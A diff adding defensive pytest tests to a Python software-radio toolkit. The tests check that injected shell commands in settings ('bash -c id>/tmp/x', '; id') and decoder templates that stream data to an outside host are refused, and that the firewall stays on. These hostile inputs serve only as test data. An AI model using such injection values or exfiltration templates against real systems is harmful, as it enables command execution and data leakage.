@@ -931,3 +931,243 @@ def test_l3_offline_sitrep_and_tiles_never_call_urlopen(net, monkeypatch, tmp_pa
     d = sitrep.gather()
     assert d["metar"] is None and sitrep._tfr(["CO"]) is None
     assert calls and all(u.startswith("http://127.0.0.1") for u in calls), calls   # loopback only
+
+
+# ================================================================== CL8-fix (RA-CL8 findings)
+def test_ra_scout_wifi_cmd_from_settings_never_reaches_another_program(monkeypatch, tmp_path):
+    """RA-CL8 blocker 1: scout.json's wifi_cmd was split and run as-is (`bash -c id>…`)."""
+    import subprocess
+    import scout
+    ran = []
+    monkeypatch.setattr(subprocess, "run", lambda argv, **k: ran.append(argv))
+    for bad in ("bash -c id>/tmp/x", "nmcli connection delete home", "nmcli dev wifi connect x",
+                "nmcli -f a dev wifi list; id", "nmcli --ask dev wifi list", "/usr/bin/nmcli dev wifi list",
+                "nmcli dev wifi list ifname ../../x", 5, None):
+        aps, err = scout.wifi_scan(bad)
+        assert aps is None and "SETTINGS REFUSED" in err, (bad, err)
+    assert ran == []
+    assert scout.wifi_argv(scout.DEFAULTS["wifi_cmd"]) == \
+        ["nmcli", "-t", "-f", "SSID,SIGNAL,CHAN,SECURITY,BSSID", "dev", "wifi", "list"]
+    assert scout.wifi_argv("nmcli -t dev wifi list ifname wlan0 --rescan yes")[-1] == "yes"
+
+
+@pytest.mark.parametrize("src,tmpl", [
+    ("sensors", "rtl_433 -F syslog:203.0.113.5:514"),
+    ("sensors", "rtl_433 -F mqtt:203.0.113.5:1883,events=x"),
+    ("sensors", "rtl_433 -F json:out.json"),
+    ("sensors", "rtl_433 -F influx:http:x"),
+    ("sensors", "rtl_433 -w capture.cu8"),
+    ("sensors", "rtl_433 -W capture.cu8"),
+    ("sensors", "rtl_433 -c evil.conf"),
+    ("sensors", "rtl_433 -S all"),
+    ("sensors", "rtl_433 -r file.cu8"),
+    ("sensors", "rtl_433 -d rtl_tcp:203.0.113.5:1234"),
+    ("sensors", "rtl_433 -d driver=remote,remote=203.0.113.5"),
+    ("sensors", "rtl_433 {gain[0]}"),
+    ("acars", "acarsdec --output json:udp:address=203.0.113.5,port=5555 {freqs}"),
+    ("acars", "acarsdec --output json:file:path=capture.json {freqs}"),
+    ("acars", "acarsdec -j 203.0.113.5:5555 {freqs}"),
+    ("acars", "acarsdec -n 203.0.113.5:5555 {freqs}"),
+    ("acars", "acarsdec -l log.txt {freqs}"),
+    ("acars", "acarsdec --rtlsdr rtl_tcp:x {freqs}"),
+    ("vdl2", "dumpvdl2 --output decoded:json:udp:address=203.0.113.5,port=5555 136650000"),
+    ("vdl2", "dumpvdl2 --output decoded:json:zmq:mode=server,endpoint=tcp://*:5555 136650000"),
+    ("vdl2", "dumpvdl2 --iq-file x.cu8 136650000"),
+    ("vdl2", "dumpvdl2 136650000 evil"),
+])
+def test_ra_decoder_templates_cannot_send_data_off_device_or_write_files(src, tmpl):
+    """RA-CL8 blocker 2: a template could stream decoded data to another host past netpolicy."""
+    import argsafe
+    import signals
+    key = {"acars": "acars_cmd", "vdl2": "vdl2_cmd"}.get(src, "rtl433_cmd")
+    with pytest.raises(argsafe.SettingsRefused):
+        signals.build_argv({"source": src, key: tmpl, "acars_freqs": [131.55]})
+
+
+def test_ra_shipped_and_old_default_templates_still_build():
+    import signals
+    for src in ("acars", "vdl2", "sensors"):
+        argv = signals.build_argv(dict(signals.DEFAULTS, source=src))
+        assert argv[0] in ("acarsdec", "dumpvdl2", "rtl_433")
+    old = signals.build_argv(dict(signals.DEFAULTS, source="acars",
+                                  acars_cmd=signals.OLD_DEFAULTS["acars_cmd"][0]))
+    assert old[:3] == ["acarsdec", "-o", "1"] and "131.550" in old
+
+
+@pytest.mark.parametrize("name,settings,mode", [
+    ("signals", {"source": "sensors", "rtl433_cmd": "rtl_433 {gain[0]}"}, "ACARS"),
+    ("signals", {"source": "acars", "acars_freqs": 5}, "ACARS"),
+    ("tpms", {"freqs": 5}, "TPMS"),
+])
+def test_ra_malformed_setting_type_refuses_and_releases_the_radio(monkeypatch, fakebin, name,
+                                                                   settings, mode):
+    """RA-CL8 NEW-1: a TypeError fell into the 'no capture (offline)' branch: radio held, retry
+    every second, no FAULT."""
+    home, marker = fakebin
+    binz = home / "fakebin"
+    for b in ("acarsdec", "rtl_433", "dumpvdl2"):
+        p = binz / b
+        p.write_text("#!/bin/sh\necho %s >> '%s'\nsleep 30\n" % (b, marker))
+        p.chmod(0o755)
+    cfg = home / ".config" / "uconsole-suite"
+    cfg.mkdir(parents=True)
+    (cfg / ("%s.json" % name)).write_text(json.dumps(settings))
+    from palisade_qt import babel, radio_arbiter as ra
+    lease = _Lease()
+    monkeypatch.setattr(ra, "_make_lease", lease.make)
+    statuses = []
+    w = babel.DecoderWorker(demo=False, mode=mode)
+    w.status.connect(statuses.append)
+    w.set_running(True)
+    w.start()
+    try:
+        assert _until(lambda: lease.released, 4000), "radio held: %r" % statuses[-3:]
+        time.sleep(1.5)
+        _app().processEvents()
+        assert len(lease.made) == 1, "retried: %r" % lease.made
+        assert any("SETTINGS REFUSED" in (st.get("sdr") or {}).get("text", "") for st in statuses)
+        assert not any("offline" in (st.get("sdr") or {}).get("text", "") for st in statuses)
+        assert not marker.exists() and ra.arbiter.owner() is None
+    finally:
+        w.stop()
+        assert w.wait(4000)
+
+
+def test_ra_unexpected_start_error_is_a_fault_and_releases_the_radio(monkeypatch, fakebin):
+    home, marker = fakebin
+    from palisade_qt import babel, radio_arbiter as ra
+    lease = _Lease()
+    monkeypatch.setattr(ra, "_make_lease", lease.make)
+
+    def boom(worker):
+        raise RuntimeError("unexpected")
+    monkeypatch.setitem(babel._LIVE_RUNNERS, "POCSAG", boom)
+    faults, statuses = [], []
+    w = babel.DecoderWorker(demo=False, mode="POCSAG")
+    w.fault.connect(faults.append)
+    w.status.connect(statuses.append)
+    w.set_running(True)
+    w.start()
+    try:
+        assert _until(lambda: lease.released, 4000)
+        time.sleep(1.2)
+        _app().processEvents()
+        assert len(lease.made) == 1
+        assert any("FAILED TO START" in (st.get("sdr") or {}).get("text", "") for st in statuses)
+        assert any("RuntimeError" in f for f in faults)
+    finally:
+        w.stop()
+        assert w.wait(4000)
+
+
+def _harden_failing(tmp_path, fail_on):
+    """harden.sh with sudo stubbed: the ufw call matching `fail_on` exits 1, the rest record."""
+    import subprocess
+    stub = tmp_path / "stub"
+    stub.mkdir(exist_ok=True)
+    rec = tmp_path / "ran.txt"
+    (stub / "sudo").write_text('#!/bin/sh\necho "sudo $*" >> "%s"\ncase "$*" in *"%s"*) exit 1;; esac\n'
+                               % (rec, fail_on))
+    (stub / "ufw").write_text("#!/bin/sh\nexit 0\n")
+    for p in stub.iterdir():
+        p.chmod(0o755)
+    env = dict(os.environ, PATH=str(stub) + os.pathsep + os.environ["PATH"])
+    r = subprocess.run(["bash", os.path.join(SUITE_DIR, "harden.sh"), "--field", "--yes"], env=env,
+                       capture_output=True, text=True, timeout=20, stdin=subprocess.DEVNULL)
+    return r, rec.read_text().splitlines()
+
+
+@pytest.mark.parametrize("fail_on", ["default deny incoming", "default allow outgoing"])
+def test_ra_harden_field_never_leaves_the_firewall_off_when_a_step_fails(tmp_path, fail_on):
+    """RA-CL8 blocker 4: `ufw --force reset` turns ufw off; a later failure under set -e used to
+    exit before `enable`."""
+    r, ran = _harden_failing(tmp_path, fail_on)
+    assert r.returncode != 0                       # the failure is still reported
+    reset = ran.index("sudo ufw --force reset")
+    assert "sudo ufw --force enable" in ran[reset:], ran
+    assert "turning the firewall back on" in r.stderr
+
+
+def test_ra_offline_loopback_through_a_remote_proxy_is_blocked(net, monkeypatch):
+    for k in ("no_proxy", "NO_PROXY"):
+        monkeypatch.delenv(k, raising=False)
+    monkeypatch.setenv("http_proxy", "http://203.0.113.9:3128")
+    with pytest.raises(net.NetBlocked):
+        net.check("http://127.0.0.1:11434/api/chat")
+    monkeypatch.setenv("http_proxy", "http://127.0.0.1:3128")        # a local proxy is fine
+    assert net.check("http://127.0.0.1:11434/api/chat") == "127.0.0.1"
+    monkeypatch.setenv("http_proxy", "http://203.0.113.9:3128")
+    net.set_mode("ONLINE", persist=False)
+    assert net.check("http://127.0.0.1:11434/api/chat") == "127.0.0.1"
+
+
+def test_ra_session_log_open_shows_the_unseen_fault_and_a_repeat_relights(net, slog):
+    from palisade_qt.panels import SessionLogPanel
+    lg = slog.log()
+    lg.record("fault", "BABEL", "decoder exited after 0.2s")
+    for i in range(40):
+        lg.record("info", "NET", "request %d allowed" % i)
+    p = SessionLogPanel(mode="dark")
+    p.resize(1000, 400)
+    p.open()
+    _app().processEvents()
+    v = p.table.view
+    row = v.currentIndex().row()
+    assert p.table.model.rows[row]["level"] == "FAULT" or "0.2s" in p.table.model.rows[row]["text"]
+    assert v.visualRect(v.currentIndex()).intersects(v.viewport().rect()), "fault not on screen"
+    assert lg.faults_unseen() == 0
+    p.close()
+    _app().processEvents()
+    lg.record("fault", "BABEL", "decoder exited after 0.2s")       # the same fault again
+    assert lg.faults_unseen() == 1
+
+
+def test_ra_prepended_rows_keep_a_scrolled_view_in_place():
+    from palisade_qt.kit import FeedTable
+    ft = FeedTable([("id", "ID"), ("v", "V")])
+    ft.resize(400, 200)
+    ft.show()
+    ft.model.set_rows([{"_id": i, "id": "r%d" % i, "v": i} for i in range(200)])
+    _app().processEvents()
+    ft.view.scrollTo(ft.model.index(100, 0), QtWidgets.QAbstractItemView.PositionAtTop)
+    _app().processEvents()
+    top = ft.model.rows[ft.view.rowAt(0)]["_id"]
+    for k in range(5):
+        ft.model.prepend({"_id": -k - 1, "id": "n%d" % k, "v": 0})
+        _app().processEvents()
+    assert ft.model.rows[ft.view.rowAt(0)]["_id"] == top
+    ft.view.scrollToTop()                                           # following the live feed
+    _app().processEvents()
+    ft.model.prepend({"_id": -99, "id": "n99", "v": 0})
+    _app().processEvents()
+    assert ft.view.rowAt(0) == 0
+    ft.close()
+
+
+def test_ra_tk_home_grid_offers_no_retired_or_hidden_tool():
+    import hub
+    src = open(hub.__file__).read()
+    assert "GROUPS = visible_groups(GROUPS)" in src
+    keys = re.findall(r'\("launch", "([a-z0-9]+)"\)', src)
+    groups = [("g", None, [(k, k, k, ("launch", k)) for k in keys])]
+    left = {t[0] for g in hub.visible_groups(groups) for t in g[2]}
+    for k in ("cw", "rtty", "digi", "replay", "pm3", "wifix", "blex", "zb", "zw", "hid",
+              "sweep", "jam", "imsi", "gnss"):
+        assert k in keys and k not in left, k
+    assert {"fm", "sky", "wifi"} <= left
+
+
+def test_ra_doctor_says_unavailable_when_libcrypt_cannot_hash_the_scheme(tmp_path, monkeypatch):
+    import doctor
+    shadow = tmp_path / "shadow"
+    shadow.write_text("dragon:$gy$j9T$salt$hash:19000:0:99999:7:::\n")
+    monkeypatch.setenv("USER", "dragon")
+    ok, msg, _ = doctor.chk_default_password(str(shadow), crypt_fn=lambda w, s: None)
+    assert ok is None and "unavailable" in msg
+
+
+def test_ra_keymap_says_seven_pages_and_sky_menu_uses_the_root_launcher():
+    from palisade_qt import panels
+    assert panels.KEYMAP[0][0] == "1 – 7"
+    tail = open(os.path.join(SUITE_DIR, "install_tail.sh")).read()
+    assert "Exec=/usr/local/bin/sky" in tail and "Exec=$HOME/.local/bin/sky" not in tail
